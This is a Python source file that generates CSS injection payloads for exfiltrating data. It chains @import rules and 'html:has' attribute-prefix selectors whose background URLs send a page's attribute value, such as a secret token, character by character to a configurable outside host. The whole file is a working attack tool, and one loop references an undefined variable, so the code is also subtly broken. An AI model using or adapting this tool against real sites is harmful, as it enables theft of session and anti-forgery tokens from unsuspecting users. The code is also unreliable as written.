import urllib.parse


def generate_payload(hostname, port, attribut, client, element):
    stri = generate_next_import(hostname=hostname, port=port, client=client)

    elements_attributs = []
    for client_element in client.elements:
        for element_attribut in client_element.attributs:
            if element_attribut == attribut:
                elements_attributs.append(element_attributs)

    # Check if the token is complete
    stri += f"html:has({element}[{attribut}={repr(client.data)}]"
    stri += f"{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})"
    stri += f"{"".join([":first-child" for i in range(client.counter)])}"
    stri += f'{{background: url("//{hostname}:{port}/end?num={client.counter}&client_id={client.id}") !important;}}'

    # Payload to extract the token
    stri += "".join(
        map(
            lambda x: f"html:has({element}[{attribut}^={repr(client.data+x)}]"
            f'{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})'
            f'{"".join([":first-child" for i in range(client.counter)])}'
            f'{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(client.data+x)}&client_id={client.id}") !important;}}\n',
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
        )
    )

    return stri


def generate_next_import(hostname, port, client):
    return f"@import url('//{hostname}:{port}/next?num={client.counter}&client_id={client.id}');"
